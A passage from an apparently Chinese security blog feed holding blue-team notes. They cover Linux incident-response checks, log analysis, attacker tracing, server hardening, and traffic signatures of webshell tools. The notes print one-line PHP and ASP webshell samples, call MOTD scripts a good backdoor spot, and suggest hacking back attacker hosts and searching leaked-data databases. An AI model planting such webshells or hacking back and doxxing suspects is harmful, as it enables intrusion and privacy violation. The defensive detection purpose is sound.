class="hljs-variable">$PID</span>/environ<br><span class="hljs-built_in">declare</span><br></code></pre></td></tr></table></figure><ul><li>SSH key</li><li>SSH config 文件</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>ssh<span class="hljs-regexp">/ssh_config 和 ~/</span>.ssh/config将<br>LocalCommand 和 ProxyCommand 参数封禁<br></code></pre></td></tr></table></figure><ul><li>alias 命令替换</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">alias 命令的功能是为命令设置别名<br>alert   <span class="hljs-regexp">//</span>检查是否存在替换<br>unalias alert   <span class="hljs-regexp">//</span>删除别名<br></code></pre></td></tr></table></figure><ul><li>DNS 配置文件</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>resolv.conf<br></code></pre></td></tr></table></figure><ul><li>禁止 ptrace_scope 操作</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/y</span>ama/ptrace_scope<br></code></pre></td></tr></table></figure><ul><li>ASLR</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>randomize_va_space   <span class="hljs-regexp">//</span>调成<span class="hljs-number">2</span>减缓溢出攻击<br></code></pre></td></tr></table></figure><ul><li>capabilities</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">getcap -r / <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span>   <span class="hljs-comment">//查看对权限的默认情况</span><br>setcap   <span class="hljs-comment">//重新设置权限</span><br></code></pre></td></tr></table></figure><ul><li>iptables 端口复用</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo iptables -L   <span class="hljs-regexp">//</span>查看默认情况<br></code></pre></td></tr></table></figure><ul><li>密码填充检查</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;:&quot;</span> -f 2 | grep -v <span class="hljs-string">&quot;x   //默认情况应该是空的</span><br></code></pre></td></tr></table></figure><ul><li>服务检查</li></ul><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">sudo</span> <span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-units</span> <span class="hljs-built_in">--type=service</span> <span class="hljs-built_in">--state=running</span>   //正在运行的服务<br><span class="hljs-string">systemctl</span> <span class="hljs-string">status</span> <span class="hljs-string">xxx</span>.<span class="hljs-string">service</span>   //查看单一服务进程状态<br><span class="hljs-string">systemctl</span> <span class="hljs-string">cat</span> <span class="hljs-string">xxx</span>.<span class="hljs-string">service</span>   //获取服务配置文件<br><span class="hljs-string">systemctl</span> <span class="hljs-string">cat</span><br></code></pre></td></tr></table></figure><ul><li>MOTD</li></ul><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery">是Linux中发送问候消息的功能，一般在我们登录服务器后显示<br>每次任意用户登录时都会触发 motd 服务的功能,这个功能的脚本几乎都是使用<span class="hljs-built_in"> root</span> 权限来启动的，所以很适合用来做后门<br></code></pre></td></tr></table></figure><ul><li>进程启动文件</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">恶意程序执行后，可能会删除本地文件，但是该文件已经被进程加载，可以通过遍历这种情况来排查恶意程序<br>sudo lsof | <span class="hljs-keyword">grep</span> deleted<br>sudo ls -al <span class="hljs-regexp">/proc/</span>*<span class="hljs-regexp">/exe 2&gt;/</span>dev<span class="hljs-regexp">/null | grep deleted   /</span><span class="hljs-regexp">/建议使用这一个命令</span><br></code></pre></td></tr></table></figure><ul><li>检查系统及应用程序配置文件</li><li>sudo 配置文件检查</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>sudo.conf<br><span class="hljs-regexp">/etc/</span>sudoers<br><span class="hljs-regexp">/etc/</span>sudoers.d/<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">第三方GPG密钥检查<br><br>sudo apt-key list<br>具体存储⽬录为 /etc/apt/<span class="hljs-keyword">trusted</span>.gpg.d/<br></code></pre></td></tr></table></figure><p>gpg –quiet –show-keys &#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;*</p><p>具体存储⽬录为 &#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;.*&quot;</span> -mtime -<span class="hljs-number">20</span> 寻找<span class="hljs-number">20</span>天内修改的隐藏文件（mmin也可以）<br><span class="hljs-built_in">find</span> . -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;*.php&quot;</span> -<span class="hljs-built_in">exec</span> grep -Hn <span class="hljs-string">&#x27;eval&#x27;</span> &#123;&#125; \;<br></code></pre></td></tr></table></figure><p>打印出包含”eval”字符串的行及其所在的文件名（-Hn 选项）。{}代表 find 命令找到的文件名，;表示结束-exec 参数。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> access.<span class="hljs-built_in">log</span>.<span class="hljs-number">1</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;/index.php&quot;</span> | wc -<span class="hljs-keyword">l</span><br></code></pre></td></tr></table></figure><p>Wc -l 统计行数</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">cat access.log.1 |<span class="hljs-string"> grep xx&quot; </span>|<span class="hljs-string"> awk &#x27;&#123;print $x&#125;&#x27; </span>|<span class="hljs-string"> sort </span>|<span class="hljs-string"> uniq -c </span>|<span class="hljs-string"> sort -nr </span>|<span class="hljs-string"> head -n 10</span><br></code></pre></td></tr></table></figure><p>head 可以改成 more</p><p>sort 排序后 uniq -c 去除重复并且统计次数，最后 sort -n 按数字-r 降序排序</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">查看进程<br>ps -<span class="hljs-selector-tag">A</span> <br>ps aux<br><span class="hljs-attribute">top</span><br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/GSxkb1iVNo7s3dxL6nkcKAaonYi.png" alt="截图"></p><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/H3efbvKvloVa4XxGDHWcNcdAnyb.png" alt="截图"></p><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/JDrebv3Vvo1Gz9xyp6jcOMnJnMf.png" alt="截图"></p><p>利用-A -B -C 显示匹配字符串上下文 -rn 查找存在响应字符串的文件</p><p>awk ‘匹配规则 {操作}’ 文件</p><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/KzL5bLE0qoJCDoxIYzwcyF5mnQb.png" alt="截图"></p><h2 id="linux-挖矿"><a href="#linux-挖矿" class="headerlink" title="linux-挖矿"></a>linux-挖矿</h2><p>netstat -anplt 发现异常外联</p><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/CvxDbdbYoo7e7xxC8xXcx2RSnid.png" alt="截图"></p><p><img src="/2024/06/27/%E8%93%9D%E9%98%9F%E7%AC%94%E8%AE%B0/G27ob7ITvoTlMCx6wkfc0X0Unzc.png" alt="截图"></p><h1 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h1><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>溯源思路：</p><ol><li><p>首先通过系统日志、安全设备截获攻击包等从中分析出攻击者的 ip 和攻击方式，通过 webshell 或者木马去微步分析，</p></li><li><p>或者去安恒威胁情报中心进行 ip 检测分析，是不是云服务器，基站等，如果是云服务器的话可以直接反渗透，看看开放端口，域名，whois 等进行判断，</p></li><li><p>获取姓名电话等丢社工库看看能不能找到更多信息然后收工</p></li></ol><p>针对国外 IP 的溯源方法：</p><ol><li>使用网络安全工具进行溯源：可以使用网络安全工具，如 traceroute、ping 等命令，对目标 IP 进行探测和跟踪。这些工具可以显示出攻击流量经过的路由器、网关和 ISP 等信息，帮助我们了解攻击流量的来源地点。</li><li>查找域名信息：通过 WHOIS 查询工具查询目标域名的注册信息，包括注册人、注册机构、联系方式等信息，可以从中了解到攻击来源的大致位置。</li><li>联系当地 ISP：如果攻击者使用的是公共网络，如酒店、咖啡厅、机场等，可以联系当地 ISP，寻求协助获取攻击来源的信息。</li></ol><h2 id="溯源反制"><a href="#溯源反制" class="headerlink" title="溯源反制"></a>溯源反制</h2><p>主要是通过混淆和伪装攻击流量，防止攻击者获取真实的攻击来源和行为信息。具体操作包括：<br>    1.使用代理服务器：通过使用代理服务器，可以改变攻击流量的来源 IP 地址，使得攻击者无法追踪真实的攻击来源。<br>    2.使用 VPN 技术：VPN 技术可以在公网上建立一个私有网络，加密传输数据流量，从而防止攻击者获取敏感信息。<br>    3.使用匿名浏览器：匿名浏览器可以隐藏用户真实的 IP 地址和浏览痕迹，使得攻击者无法追踪用户的真实身份和行为。<br>    4.使用虚假数据：在攻击流量中混入虚假的数据，如虚假的 IP 地址、协议和端口等信息，可以混淆攻击者的追踪。</p><h1 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>注入型内存马：通过利用漏洞将恶意代码注入到正常进程中，从而在内存中运行。<br>自执行型内存马：将恶意代码写入自启动项，启动后自动运行。<br>进程注入型内存马：利用进程注入技术，在受感染进程的内存中运行恶意代码。<br>Hook 型内存马：利用 Windows API 的 Hook 机制，修改进程中的关键函数，从而运行恶意代码。<br>要判断内存马的类型，可以使用反病毒软件或专门的安全工具对受感染主机进行扫描和分析。一般来说，不同类型的内存马会留下不同的痕迹和特征，比如某些进程的不正常行为、异常的网络连接等等。</p><h2 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h2><p>注入型内存马：修复漏洞、升级软件，加强网络安全防护等方法来预防类似攻击；对已经感染的主机，可以通过杀掉受感染进程或卸载恶意程序等方式来清除内存马。<br>自执行型内存马：可以通过清理自启动项、卸载恶意程序等方式来清除内存马。<br>进程注入型内存马：可以通过杀掉受感染进程或卸载恶意程序等方式来清除内存马。<br>Hook 型内存马：可以通过还原 Hook、修复关键函数、杀掉受感染进程或卸载恶意程序等方式来清除内存马。</p><h1 id="基线检查"><a href="#基线检查" class="headerlink" title="基线检查"></a>基线检查</h1><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="账号管理和授权"><a href="#账号管理和授权" class="headerlink" title="账号管理和授权"></a>账号管理和授权</h3><ul><li>检查特殊账号，是否存在空密码的账户和root权限账户</li><li>禁用或删除无用账号</li><li>添加口令策略:<code>/etc/login.defs</code>修改配置文件，设置过期时间、连续认证失败次数</li><li>禁止root远程登录，限制root用户直接登录。</li><li>检查su权限。<code>vi /etc/pam.d/su</code>添加<code>auth required pam_wheel.so group=test</code></li></ul><h3 id="服务-1"><a href="#服务-1" class="headerlink" title="服务"></a>服务</h3><ul><li>关闭不必要的服务</li><li>SSH服务安全<ul><li>不允许root账号直接登录系统，<code>PermitRootLogin=no</code></li><li>修改SSH使用的协议版本为2</li><li>修改允许密码错误次数（默认6次），<code>MaxAuthTries=3</code></li></ul></li></ul><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><ul><li>设置umask值 <code>vi /etc/profile</code> 添加行 <code>umask 027</code></li><li>设置登录超时 <code>vi /etc/profile</code> 修改配置文件，将以 <code>TMOUT=</code> 开头的行注释，设置为 <code>TMOUT=180</code></li></ul><h3 id="日志-2"><a href="#日志-2" class="headerlink" title="日志"></a>日志</h3><ul><li>启用syslogd日志，配置日志目录权限，或者设置日志服务器</li><li>记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查。<a href="https://www.alibabacloud.com/help/zh/faq-detail/49809.htm">https://www.alibabacloud.com/help/zh/faq-detail/49809.htm</a></li></ul><h3 id="IP协议安全要求"><a href="#IP协议安全要求" class="headerlink" title="IP协议安全要求"></a>IP协议安全要求</h3><ul><li>远程登录取消telnet采用ssh</li><li>设置&#x2F;etc&#x2F;hosts.allow和deny</li><li>禁止ICMP重定向</li><li>禁止源路由转发</li><li>防ssh破解，iptables(对已经建立的所有链接都放行，限制每分钟连接ssh的次数)+denyhost(添加ip拒绝访问)</li></ul><h2 id="中间件基线规范（APACHE）"><a href="#中间件基线规范（APACHE）" class="headerlink" title="中间件基线规范（APACHE）"></a>中间件基线规范（APACHE）</h2><blockquote><p><a href="https://www.alibabacloud.com/help/zh/faq-detail/52981.htm">https://www.alibabacloud.com/help/zh/faq-detail/52981.htm</a></p></blockquote><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ul><li>账号</li><li>授权</li><li>日志</li><li>session过期时间（防ddos</li><li>绑定监听地址</li></ul><h3 id="禁止"><a href="#禁止" class="headerlink" title="禁止"></a>禁止</h3><ul><li>目录权限</li><li>访问外部文件</li><li>CGI</li><li>非法HTTP方法（PUT DELETE）</li></ul><h3 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h3><ul><li>服务版本号</li><li>重定向错误页面</li></ul><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><ul><li>配置文件</li><li>默认安装的无用文件</li></ul><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a><strong>补充</strong></h1><h2 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a><strong>守护进程</strong></h2><p>守护进程是什么？ 其他进程都是在用户登录或运行程序时创建，在运行结束或用户注销时终止，但系统服务进程（守护进程）不受用户登录注销的影响，它们一直在运行着。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 守护进程的本质是什么？ </span><br>守护进程的本职就是孤儿进程，该进程自成会话，自成进程组，一般守护进程与终端无关；（即：<span class="hljs-attribute">pid</span>=sid=gid） <br>后台进程受用户登录注销的影响，而守护进程不受用户登录和注销的影响。但是它们都受关机的影响。<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 守护进程有什么特点？ </span><br>没有控制终端，终端名设置为？号 <br>父进程不是用户创建的进程，一般由init进程或者systemd（<span class="hljs-attribute">pid</span>=1）的进程为父进程 <br>进程名字通常以字母 d 结束 <br>工作目录为/（根），主要是为了防止占用磁盘导致无法卸载磁盘 <br>以kthreadd内核进程创建的守护进程以kthreadd为父进程<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># 守护进程如何设置？ </span><br>执行一个<span class="hljs-keyword">fork</span>()，之后父进程退出，子进程继续执行。 <br>子进程调用setsid()开启一个新回话并释放它与控制终端之间的所有关联关系。 <br>在setsid()调用之后执行第二个<span class="hljs-keyword">fork</span>()，让父进程退出并让孙进程继续执行。确保了子进程不会成为会话组长。 （根据System V中获取终端的规则，进程永远不会重新请求一个控制终端。多一个<span class="hljs-keyword">fork</span>()调用不会带来任何坏处。） <br>使用 <span class="hljs-keyword">umask</span>(<span class="hljs-number">0</span>); 清除进程的<span class="hljs-keyword">umask</span>以确保当daemon创建文件和目录时拥有所需的权限。 <span class="hljs-number">5</span>. 修改进程的当前工作目录，通常会改为根目录（/）。 <span class="hljs-number">6</span>. 关闭daemon从其父进程继承而来的所有打开着的文件描述符。<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 守护进程如何删除？ </span><br>首先<span class="hljs-built_in">ps</span> axj | grep 守护进程名字，找到相应的守护进程，然后使用<span class="hljs-built_in">kill</span> <span class="hljs-literal">-9</span> 守护进程名杀掉；<br>利用<span class="hljs-built_in">ps</span> <span class="hljs-literal">-ef</span>命令查找相应的守护进程，再用<span class="hljs-built_in">kill</span> <span class="hljs-literal">-9</span>命令将其杀死；<br>创建shell脚本对进程的启动、关闭、重启进行自动管理。 注：<span class="hljs-built_in">kill</span> <span class="hljs-literal">-9</span> <span class="hljs-literal">-pid</span>   （杀掉进程组）<br></code></pre></td></tr></table></figure><h3 id="screen-的原理"><a href="#screen-的原理" class="headerlink" title="screen 的原理"></a><strong>screen 的原理</strong></h3><ul><li>当用户启动 Screen 时，它会创建一个守护进程作为后台进程，并与用户终端会话（称为控制终端）分离。</li><li>控制终端不再直接处理用户输入和输出，而是由 Screen 守护进程负责接收和处理。</li><li>守护进程通过与 Unix 域套接字进行通信，与控制终端保持连接。</li><li>用户在控制终端中输入的命令会被发送到守护进程，并由守护进程解析和执行。</li><li>守护进程还负责从虚拟终端读取输出内容，并将其发送回控制终端进行显示。</li></ul><p>通过这种方式，Screen 实现了在控制终端与守护进程之间的交互，并通过守护进程来管理多个虚拟终端、处理窗口切换、保存会话状态等功能。</p><p>需要注意的是，虽然 Screen 的守护进程在后台运行，但用户仍然可以通过重新连接到控制终端来恢复与之前会话的交互，即使之前的 SSH 连接断开或终端关闭。这是 Screen 的一个重要特性，允许用户在断开连接后恢复他们的工作环境。</p><h3 id="恢复守护进程会话的交互"><a href="#恢复守护进程会话的交互" class="headerlink" title="恢复守护进程会话的交互"></a><strong>恢复守护进程会话的交互</strong></h3><p>可以使用 <code>nohup</code> 命令启动一个守护进程，并将输出重定向到文件中，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nohup ./your_daemon &amp;<br></code></pre></td></tr></table></figure><p>通过这种方式启动的守护进程不会因为用户退出终端而停止运行。</p><p>当用户重新连接到控制终端时，可以使用 <code>jobs</code> 命令查看守护进程的状态，并使用 <code>fg</code> 命令将其调至前台，恢复与之前会话的交互。例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">jobs<br>fg %job_id<br></code></pre></td></tr></table></figure><p>其中，<code>job_id</code> 是守护进程的作业号，可以在 <code>jobs</code> 命令的输出中找到</p><h2 id="IDS-IPS"><a href="#IDS-IPS" class="headerlink" title="IDS&#x2F;IPS"></a>IDS&#x2F;IPS</h2><p>IDS（Intrusion Detection System）入侵检测系统</p><p>IPS (Intrusion Prevention System)  入侵防御系统</p><blockquote><p>与防火墙相似，IPS 内嵌部署到流量中。IPS 是一个主动的网络组件，会检查每个通过的数据包，并根据其配置和策略采取正确的补救措施。相反，IDS 是一个被动组件，通常不会内嵌部署，而是通过 SPAN 或 TAP 技术监控流量，然后发出通知</p></blockquote><h3 id="IPS-阻断"><a href="#IPS-阻断" class="headerlink" title="IPS 阻断"></a>IPS 阻断</h3>]]></content>
    
    
    <categories>
      
      <category>蓝队</category>
      
    </categories>
    
    
    <tags>
      
      <tag>蓝队</tag>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶场记录</title>
    <link href="/2024/03/21/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/03/21/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<div class="row">    <embed src="./靶场记录.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
    
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tp5.1反序列化漏洞复现</title>
    <link href="/2024/03/21/tp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/03/21/tp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<div class="row">    <embed src="/pdf/tp5.1反序列化漏洞复现.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web知识点</title>
    <link href="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB-知识点"><a href="#WEB-知识点" class="headerlink" title="WEB 知识点"></a>WEB 知识点</h1><p>用来记一些知识点的概念</p><h1 id="防溯源"><a href="#防溯源" class="headerlink" title="防溯源"></a>防溯源</h1><p><a href="https://github.com/aplyc1a/blogs/blob/master/%E8%BA%B2%E9%81%BF%E6%A3%80%E6%B5%8B/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%9A%90%E8%97%8F.md#31-%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E6%8C%87%E7%BA%B9">blogs&#x2F;躲避检测&#x2F;渗透测试中的身份隐藏.md at master · aplyc1a&#x2F;blogs (github.com)</a></p><h1 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h1><h2 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h2><h3 id="1-0"><a href="#1-0" class="headerlink" title="1.0"></a>1.0</h3><p>1.Accpet 头 application&#x2F;xhtml+xmlapplication&#x2F;xmlapplication&#x2F;signed-exchange</p><p>2.<code>Content-Type: application/octet-stream</code> 这是一个强特征，查阅资料可知 octet-stream 的意思是，只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组），所以很少使用</p><h3 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h3><p>1.使用 <strong>AES+base64</strong>,AES 使用动态秘钥进行加密。</p><p>2.请求的时候内置了<strong>十几个 UA</strong> 头，（导致频繁变化）</p><p>3.Content-Length: 16</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/ZkLLbV8PDoDXJ5xEqXUcebJKnJf.png"></p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/NGMtbsH4IoqQNSxSmDFckIJxnhb.png"></p><h3 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h3><blockquote><p>在冰蝎中，任何请求，最终都会调用 Utils.getData 函数，对请求的参数加密。对于上传文件，命令执行来讲，加密的参数不定长。但是对于密钥交互，获取基本信息来讲，payload 都为定长，且无随机 padding。</p></blockquote><p>1.<strong>固定链接秘钥</strong></p><p>2.webshell 默认密码 <strong>rebeyond</strong>（md5(‘rebeyond’)[0:16]&#x3D;e45e329feb5d925b）</p><p>3.连接 jsp 的数据包 content-type 常建伟 <strong>application&#x2F;octet-stream</strong></p><p>4.Accept 头 <code>application/xhtml+xmlapplication/xmlapplication/signed-exchange</code></p><h3 id="4-0"><a href="#4-0" class="headerlink" title="4.0"></a>4.0</h3><p>1.取消连接密码，自定义传输协议算法，默认连接密码 <strong>rebeyond</strong> (md5(‘rebeyond’)[0:16]&#x3D;e45e329feb5d925b)</p><p>2.Accept 字段（弱特征）通常是: application&#x2F;json, text&#x2F;javascript, &#x2F;; q&#x3D;0.01 意思是浏览器可接受任何文件，但最倾向 application&#x2F;json 和 text&#x2F;javascript。<br>3.Content-Type 字段（弱特征），通常是 Content-type: Application&#x2F;x-www-form-urlencoded<br>4.连接使用本地端口在 49700 左右(<strong>就是比较大的端口</strong>)，每连接一次，每建立一次新的连接，端口就依次增加。<br>5.使用<strong>长连接</strong>，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection：Keep-Alive<br>6.固定的<strong>请求头和响应头</strong>，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg&#x2F;M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</p><h2 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h2><p>类似冰蝎 2.0 的密钥交换方式，webshell 动态生成</p><p><a href="https://github.com/BeichenDream/Godzilla/releases">https://github.com/BeichenDream/Godzilla/releases</a></p><h3 id="静态特征"><a href="#静态特征" class="headerlink" title="静态特征"></a><strong>静态特征</strong></h3><p>  在默认脚本编码的情况下，jsp 会出现 xc、pass 字符和 Java 反射(ClassLoader，getClass().getClassLoader())，base64 加解码等特征。</p><h3 id="动态特征"><a href="#动态特征" class="headerlink" title="动态特征"></a><strong>动态特征</strong></h3><p>  1.Accept 字段（弱特征），默认是 <code>Accept:text/html, image/gif, image/jpeg, *; q=.2, /; q=.2</code><br>  2.Cookie 中有一个非常关键的特征，最后会有个分号。估计后续的版本会修复。<br>  3.响应体的数据有一定特征，哥斯拉会把一个 32 位的 md5 字符串按照一半拆分，分别放在 base64 编码的数据的前后两部分。整个响应包的结构体征为：<strong>md5 前十六位 +base64+md5 后十六位。</strong><br>  4.请求包长度 <strong>52541</strong><br>  5.以 <code>pass=“xxxx”</code> 开始请求包<br>  6.请求包较长，响应包为 0<br>  7.一个 tcp 包里面有三个 http<br>  8.一共 6 个 http 报文，3 去 3 回</p><h2 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a><strong>蚁剑</strong></h2><h3 id="静态特征-1"><a href="#静态特征-1" class="headerlink" title="静态特征"></a><strong>静态特征</strong></h3><p>  蚁剑中 php 使用 assert、eval 执行；asp 只有 eval 执行；在 jsp 使用的是 Java 类加载（ClassLoader），同时会带有 base64 编码解码等字符特征。</p><h3 id="动态特征-1"><a href="#动态特征-1" class="headerlink" title="动态特征"></a><strong>动态特征</strong></h3><p>  1.我们使用一句话木马上传 webshell，抓包后会发现每个请求体都存在以 <code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0)</code> 开头。<br>  2.并且响应体的返回结果是 base64 编码发混淆字符，格式为：随机数 结果 随机数。<br>  3.参数名大多以“_0x…..&#x3D;”这种形式（下划线可替换为其他）所以，以_0x 开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征。</p><p>4.UA 头是 antsword xxx</p><h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a><strong>菜刀</strong></h2><p>  菜刀使用一句话木马，特征十分明显，在 PHP、ASP、ASP.NET 的网站都可以：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP:  <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>([<span class="hljs-variable">$_post</span>[<span class="hljs-string">&#x27;test&#x27;</span>]]); <span class="hljs-meta">?&gt;</span><br>ASP:  &lt;% <span class="hljs-keyword">eval</span> <span class="hljs-title function_ invoke__">request</span>(<span class="hljs-string">&quot;test&quot;</span>)%&gt;<br>ASP.NET:  &lt;%@ Page 